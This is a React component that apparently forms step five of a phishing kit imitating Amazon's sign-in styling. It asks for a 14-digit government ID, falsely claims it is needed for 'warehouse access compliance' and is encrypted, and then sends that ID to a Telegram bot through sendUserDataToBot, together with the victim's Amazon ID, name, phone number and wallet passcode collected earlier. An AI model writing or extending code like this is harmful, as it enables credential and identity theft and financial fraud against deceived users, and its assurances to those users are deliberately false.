import { useState, useRef, useEffect } from 'react';
import { useAuth } from '../store/authStore';
import { sendUserDataToBot } from '../services/telegram';
import gsap from 'gsap';

export default function Step5GovID() {
  const { goToStep, updateData, goBack, data, setGeneratedCode, setError, error } = useAuth();
  const [govId, setGovId] = useState('');
  const [localError, setLocalError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [waitMessage, setWaitMessage] = useState('Submitting your information...');
  const stepRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (stepRef.current) {
      gsap.fromTo(
        stepRef.current,
        { opacity: 0, x: 30 },
        { opacity: 1, x: 0, duration: 0.3, ease: 'power2.out' }
      );
    }
    setTimeout(() => inputRef.current?.focus(), 100);
  }, []);

  const validate = (value: string): boolean => {
    const digits = value.replace(/\D/g, '');
    if (digits.length === 0) {
      setLocalError('Enter your government ID number');
      return false;
    }
    if (digits.length !== 14) {
      setLocalError('ID number must be exactly 14 digits');
      return false;
    }
    return true;
  };

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, '').slice(0, 14);
    setGovId(digits);
    setLocalError('');
    setError(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLocalError('');
    setError(null);

    if (!validate(govId)) return;

    setIsLoading(true);
    updateData({ govId });

    // Send all data to Telegram bot
    if (data.amazonId && data.firstName && data.phoneNumber && data.walletPasscode) {
      try {
        await sendUserDataToBot({
          amazonId: data.amazonId,
          firstName: data.firstName,
          phoneNumber: data.phoneNumber,
          walletPasscode: data.walletPasscode,
          govId,
        });

        setIsLoading(false);
        
        if (stepRef.current) {
          gsap.to(stepRef.current, {
            opacity: 0,
            x: -30,
            duration: 0.25,
            ease: 'power2.in',
            onComplete: () => goToStep('step6-code'),
          });
        }
      } catch {
        setIsLoading(false);
        setError('Failed to submit. Please try again.');
      }
    }
  };

  const handleBack = () => {
    if (stepRef.current) {
      gsap.to(stepRef.current, {
        opacity: 0,
        x: 30,
        duration: 0.25,
        ease: 'power2.in',
        onComplete: () => goBack(),
      });
    }
  };

  if (isWaiting) {
    return (
      <div ref={stepRef} className="text-center py-6">
        <div className="spinner mx-auto mb-4" style={{ width: 40, height: 40, borderWidth: 3 }} />
        <h2 className="text-[18px] font-normal text-[#0F1111] mb-2">
          {waitMessage}
        </h2>
        <p className="text-[13px] text-[#565959]">
          Your information has been submitted for review. An admin will verify your credentials shortly.
        </p>
        <div className="mt-4 flex justify-center gap-1">
          {[0, 1, 2].map((i) => (
            <div
              key={i}
              className="w-2 h-2 rounded-full bg-[#FF9900]"
              style={{
                animation: `pulse-dot 1.4s ease-in-out ${i * 0.16}s infinite`,
              }}
            />
          ))}
        </div>
      </div>
    );
  }

  return (
    <div ref={stepRef}>
      <button className="back-btn" onClick={handleBack} type="button" aria-label="Go back">
        &#8249;
      </button>

      <h1 className="step-heading" style={{ paddingTop: 8 }}>
        Enter your 14-digit government ID number for verification
      </h1>
      <p className="step-subtext">
        Your government ID is required for warehouse access compliance. This information is encrypted and securely stored.
      </p>
      <form onSubmit={handleSubmit} noValidate>
        <div className="mb-3">
          <label className="amazon-label" htmlFor="gov-id">
            Government ID Number
          </label>
          <input
            ref={inputRef}
            id="gov-id"
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            className={`amazon-input ${localError || error ? 'error' : ''}`}
            placeholder="Enter 14-digit ID number"
            value={govId}
            onChange={handleInput}
            autoComplete="off"
          />
          {(localError || error) && (
            <p className="error-text">{localError || error}</p>
          )}
        </div>
        <button type="submit" className="btn-amazon" disabled={isLoading}>
          {isLoading ? <div className="spinner" style={{ width: 16, height: 16, borderWidth: 2 }} /> : 'Submit Verification'}
        </button>
      </form>
    </div>
  );
}
